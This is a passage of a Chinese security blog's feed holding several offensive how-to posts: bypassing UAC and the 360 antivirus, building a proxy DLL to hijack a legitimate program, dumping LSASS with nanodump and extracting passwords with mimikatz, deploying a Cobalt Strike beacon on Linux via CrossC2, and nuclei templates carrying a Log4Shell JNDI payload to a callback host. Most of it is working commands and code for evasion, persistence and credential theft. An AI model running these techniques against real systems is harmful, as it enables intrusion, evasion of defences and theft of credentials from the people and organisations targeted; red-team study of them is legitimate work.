class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="COM接口"><a href="#COM接口" class="headerlink" title="COM接口"></a>COM接口</h3><p>COM接口也会被360核晶拦截，其他杀软可以过</p><p>在打像WDF可以上线后直接使用Com接口BypassUAC之后添加排除项</p><p>利用工具查看Elevation属性，在Enabled和Auto Approval值都是True才能bypassUAC</p><p>UAC在判断系统进程是否可信，判断依据是PEB结构，因此在使用COM组件提权之前我们将进程信息伪装成可信程序，例如c:\windows\explorer.exe等就能够BypassUAC。参见<a href="https://github.com/0xlane/BypassUAC/blob/master/BypassUAC/main.cpp%E4%B8%AD%E7%9A%84MasqueradePEB">https://github.com/0xlane/BypassUAC/blob/master/BypassUAC/main.cpp中的MasqueradePEB</a></p><p>refer:</p><p><a href="https://github.com/0xlane/BypassUAC/tree/master">https://github.com/0xlane/BypassUAC/tree/master</a></p><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>也是鸡肋的办法，需要访问GUI界面</p><p>添加计划任务，并设置开启属性<code>使用最高权限运行</code>，等执行计划任务运行高权限。过程不触发UAC</p><h3 id="Windows自身漏洞"><a href="#Windows自身漏洞" class="headerlink" title="Windows自身漏洞"></a>Windows自身漏洞</h3><h2 id="针对360核晶的BypassUAC"><a href="#针对360核晶的BypassUAC" class="headerlink" title="针对360核晶的BypassUAC"></a>针对360核晶的BypassUAC</h2><p>针对其他一般的杀软BypassUAC随便过，360核晶对COM接口和注册表监控比较严格一般来说无法使用这两种方法绕过。可行的方法：</p><p>1.白名单+DLL劫持</p><p>2.致盲360核晶</p><p>3.RPC加载驱动Kill掉360核晶</p><p>4.可以进GUI界面点点计划任务上线</p>]]></content>
    
    
    <summary type="html">BypassUAC的多种方式</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>挖掘白加黑DLL劫持漏洞</title>
    <link href="http://example.com/posts/3411119311.html"/>
    <id>http://example.com/posts/3411119311.html</id>
    <published>2024-02-21T02:04:39.000Z</published>
    <updated>2024-06-20T09:04:05.173Z</updated>
    
    <content type="html"><![CDATA[<h1 id="挖掘白加黑DLL劫持漏洞"><a href="#挖掘白加黑DLL劫持漏洞" class="headerlink" title="挖掘白加黑DLL劫持漏洞"></a>挖掘白加黑DLL劫持漏洞</h1><p>Tips:</p><p>白程序+黑DLL</p><p>黑DLL需要优先正常DLL目录，并且DLL不在WIndows KnowDLLs列表中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&quot;</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221102021774.png" alt="image-20240221102021774"></p><p>DLL劫持分为两种：</p><p>1.劫持不存在的DLL</p><p>2.劫持已存在的DLL</p><h2 id="准备测试DLL"><a href="#准备测试DLL" class="headerlink" title="准备测试DLL"></a>准备测试DLL</h2><p>准备一个弹计算器的DLL 运行库MT编译x64和x86版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//DLL进程装载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        system(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="comment">//DLL线程装载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="comment">//DLL线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="comment">//DLL进程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="劫持不存在的DLL"><a href="#劫持不存在的DLL" class="headerlink" title="劫持不存在的DLL"></a>劫持不存在的DLL</h2><p>这种是最简单的情况</p><p>劫持程序uc.exe</p><p>利用Process Monitor工具 首先添加filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Process name uc.exe</span><br><span class="line">Result is NAME NOT FOUND</span><br><span class="line">Path ends with .dll</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113144776.png" alt="image-20240221113144776"></p><p>返回结果中找到iconv.dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113234544.png" alt="image-20240221113234544"></p><p>其stack调用了LoadLibrary函数</p><blockquote><p><code>LoadLibrary</code>和<code>LoadLibraryEx</code>一个是本地加载，一个是远程加载，如果DLL不在调用的同一目录下，就可以使用<code>LoadLibrary(L&quot;DLL绝对路径&quot;)</code>加载。但是如果DLL内部又调用一个DLL，就需要使用<code>LoadLibraryEx</code>进行远程加载</p></blockquote><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113404722.png" alt="image-20240221113404722"></p><p>在iconv.dll同级目录下都是x64位的，所以替换的也是x64位dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113517102.png" alt="image-20240221113517102"></p><p>替换后启动uc.exe，成功弹出计算器</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113558921.png" alt="image-20240221113558921"></p><h2 id="劫持已存在的DLL"><a href="#劫持已存在的DLL" class="headerlink" title="劫持已存在的DLL"></a>劫持已存在的DLL</h2><p>还是利用Process Monitor添加filter</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221150006453.png" alt="image-20240221150006453"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Process name uc.exe</span><br><span class="line">Result is SUCCESS</span><br><span class="line">Path begins with D:\UltraCompare</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221145848438.png" alt="image-20240221145848438"></p><p>这里可以采用DLL转发方式，可以利用工具AheadLib+，但是这个工具内联了__asm在VS2022x64下不支持，只能用来生成x86的dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221131153988.png" alt="image-20240221131153988"></p><p>在github上找到了个好用的工具：</p><p><a href="https://github.com/strivexjun/AheadLib-x86-x64">https://github.com/strivexjun/AheadLib-x86-x64</a></p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151226028.png" alt="image-20240221151226028"></p><p>点击Makefile后生成2个文件</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151340085.png" alt="image-20240221151340085"></p><p>VS新建DLL项目导入这两个文件</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151425359.png" alt="image-20240221151425359"></p><p>.asm文件需要设置属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">把 .asm 文件添加到工程一次</span><br><span class="line">右键单击文件-属性-常规-</span><br><span class="line">项类型:自定义生成工具</span><br><span class="line">从生成中排除:否</span><br><span class="line"></span><br><span class="line">然后复制下面命令填入</span><br><span class="line">命令行: ml64 /Fo $(IntDir)%(fileName).obj /c /Cp %(fileName).asm</span><br><span class="line">输出: $(IntDir)%(fileName).obj;%(Outputs)</span><br><span class="line">链接对象: 是</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151535574.png" alt="image-20240221151535574"></p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151544478.png" alt="image-20240221151544478"></p><p>之后运行库改MT，开始修改代码新增弹计算器的代码</p><p>老哥在生成的代码里加了新建线程执行，避免了白加黑CS的死锁问题</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151928771.png" alt="image-20240221151928771"></p><p>之后又改了转发文件的代码转发到同目录的zlib1Org.dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152026911.png" alt="image-20240221152026911"></p><p>因为找不到shlwapi.h文件一些API找不到标识符</p><p>在framework.h中添加#include &lt;shlwapi.h&gt;</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152141898.png" alt="image-20240221152141898"></p><p>可以正常编译了，直接编译DLL</p><p>将编译好的DLL改名zlib1.dll原来的DLL改名zlib1Org.dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152353758.png" alt="image-20240221152353758"></p><p>启动uc.exe 成功弹出计算器</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152458563.png" alt="image-20240221152458563"></p>]]></content>
    
    
    <summary type="html">挖掘白加黑DLL劫持漏洞</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>360核晶下的dumplsass</title>
    <link href="http://example.com/posts/666266413.html"/>
    <id>http://example.com/posts/666266413.html</id>
    <published>2024-02-20T14:40:21.000Z</published>
    <updated>2024-06-20T09:03:29.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="360核晶下的dumplsass"><a href="#360核晶下的dumplsass" class="headerlink" title="360核晶下的dumplsass"></a>360核晶下的dumplsass</h1><h2 id="无PPL"><a href="#无PPL" class="headerlink" title="无PPL"></a>无PPL</h2><p>测试环境为Win10 全程开启360核晶</p><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224359620.png" alt="image-20240220224359620"></p><p>在免杀上线beacon后利用nanodump BOF直接dump</p><p>工具地址：<a href="https://github.com/fortra/nanodump">https://github.com/fortra/nanodump</a></p><p>需要注意只有x64的免杀马才能用nanodump</p><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221001840948.png" alt="image-20240221001840948"></p><p>CS下载到本地，若未指定–valid，需要先还原签名</p><p>ps：一开始以为PPL的原因解密时报错LSA </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./restore_signature WINDOWS-10_1708444406_lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002103881.png" alt="image-20240221002103881"></p><p>mimikatz解密</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump WINDOWS-10_1708444406_lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002435120.png" alt="image-20240221002435120"></p><h2 id="有PPL"><a href="#有PPL" class="headerlink" title="有PPL"></a>有PPL</h2><p>Win10有PPL进程保护 能dump解密不了 会报LSA的错误</p><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224102918.png" alt="image-20240220224102918"></p><p>nanodump中自带了PPL绕过可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nanodump_ppl_dump -v -w C:\Windows\Temp\lsass.dmp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nanodump_ppl_medic -v -w C:\Windows\Temp\lsass.dmp</span><br></pre></td></tr></table></figure><p>其他绕过方式可以参考这篇文章：</p><p><a href="https://tttang.com/archive/1743/">https://tttang.com/archive/1743/</a></p>]]></content>
    
    
    <summary type="html">360核晶下的dumplsass</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>利用CrossC2插件Linux上线CS</title>
    <link href="http://example.com/posts/3584873491.html"/>
    <id>http://example.com/posts/3584873491.html</id>
    <published>2024-02-20T10:30:08.000Z</published>
    <updated>2024-06-20T09:04:53.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>利用CrossC2插件解决Linux无法上线CobaltStrike</p><p><strong>插件地址</strong></p><p><a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="下载需要的CNA以及CS客户端类型"><a href="#下载需要的CNA以及CS客户端类型" class="headerlink" title="下载需要的CNA以及CS客户端类型"></a>下载需要的CNA以及CS客户端类型</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220184818465.png" alt="image-20231220184818465"></p><h3 id="配置CNA文件"><a href="#配置CNA文件" class="headerlink" title="配置CNA文件"></a>配置CNA文件</h3><p>$CC2_PATH是插件的绝对路径</p><p>$CC2_BIN 是配置客户端类型</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220184956818.png" alt="image-20231220184956818"></p><p>根据路径修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$CC2_PATH = &quot;D:\\TPA\\CS CNA\\CrossC2\\&quot;; # &lt;-------- fix</span><br><span class="line">$CC2_BIN = &quot;genCrossC2.exe&quot;;</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220192032101.png" alt="image-20231220192032101"></p><h3 id="下载服务端"><a href="#下载服务端" class="headerlink" title="下载服务端"></a>下载服务端</h3><p>下载teamserver下的<code>.cobaltstrike.beacon_keys</code>文件到本地</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220195812077.png" alt="image-20231220195812077"></p><h3 id="创建CrossC2-Listener"><a href="#创建CrossC2-Listener" class="headerlink" title="创建CrossC2 Listener"></a>创建CrossC2 Listener</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220195705966.png" alt="image-20231220195705966"></p><p>进行响应配置</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200043925.png" alt="image-20231220200043925"></p><p>点击build，看Log执行了成功生成了<code>t_c22.out</code>和<code>t_c22.out.lib</code></p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200143248.png" alt="image-20231220200143248"></p><p>在CS的客户端目录进行查看</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200348667.png" alt="image-20231220200348667"></p><h3 id="上线Linux机器"><a href="#上线Linux机器" class="headerlink" title="上线Linux机器"></a>上线Linux机器</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220212746796.png" alt="image-20231220212746796"></p><p>选择C2的监听器，之后执行curl命令</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220212847752.png" alt="image-20231220212847752"></p><p>到这里来说应该上线了，但是没有很看了很多资料文章无法解决，到这里采用第二种方式不用GUI插件了（还是命令好使）</p><h3 id="命令生成上线"><a href="#命令生成上线" class="headerlink" title="命令生成上线"></a>命令生成上线</h3><p>首先建一个HTTPS的监听器，必须是HTTPS</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213151371.png" alt="image-20231220213151371"></p><p>将服务器的<code>.cobaltstrike.beacon_keys</code>文件放在与下载的genCrossC2.Linux在同一目录下，我直接将genCrossC2.Linux放在了Teamserver的目录下（也可以指定）</p><p>给执行权限然后执行命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./genCrossC2.Linux 192.168.157.201 443 null null Linux x64 <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213530621.png" alt="image-20231220213530621"></p><p>上传到getshell的机器执行test文件，成功上线Linux机器</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213705374.png" alt="image-20231220213705374"></p>]]></content>
    
    
    <summary type="html">利用CrossC2插件Linux上线CS</summary>
    
    
    
    <category term="内网安全" scheme="http://example.com/category/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网安全" scheme="http://example.com/tag/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>nuclei常用templates模板</title>
    <link href="http://example.com/posts/1628988354.html"/>
    <id>http://example.com/posts/1628988354.html</id>
    <published>2024-01-31T06:59:13.000Z</published>
    <updated>2024-03-03T14:41:59.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nuclei常用templates模板"><a href="#nuclei常用templates模板" class="headerlink" title="nuclei常用templates模板"></a>nuclei常用templates模板</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">base</span>  </span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">base</span> </span><br><span class="line">  <span class="attr">author:</span> <span class="string">msk</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">描述漏洞基本情况</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">info</span> <span class="string">漏洞等级</span></span><br><span class="line">  <span class="attr">reference:</span> <span class="string">https://www.exploit-db.com/ghdb/6814</span>  <span class="string">漏洞来源</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">detect</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">veified:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">fofa语法</span></span><br><span class="line">    <span class="attr">hunter-query:</span> <span class="string">鹰图语法</span></span><br><span class="line"></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        GET /xxxx/xxx HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string">        Connection: keep-alive</span></span><br><span class="line"><span class="string">        Cookie: OFBiz.Visitor=$&#123;jndi:ldap://&#123;&#123;interactsh-url&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">        Content-Type: application/json;charset=UTF-8</span></span><br><span class="line"><span class="string">        user-client: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span></span><br><span class="line">        <span class="attr">dsl:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;status_code==200 &amp;&amp; contains_all(body,&quot;xxx1&quot;,&quot;xxx2&quot;)&#x27;</span> <span class="comment"># 匹配多个Responses中关键词</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">CVE-xxxx-xxxxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/(poc部分)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;(你具体要在响应包所匹配的值)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">id:</span> <span class="string">CNVD-xxxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">num1:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;rand_int(800000, 999999)&#125;&#125;</span>&quot;</span></span><br><span class="line">  <span class="attr">num2:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;rand_int(800000, 999999)&#125;&#125;</span>&quot;</span></span><br><span class="line">  <span class="attr">result:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;to_number(num1)*to_number(num2)&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/(poc)<span 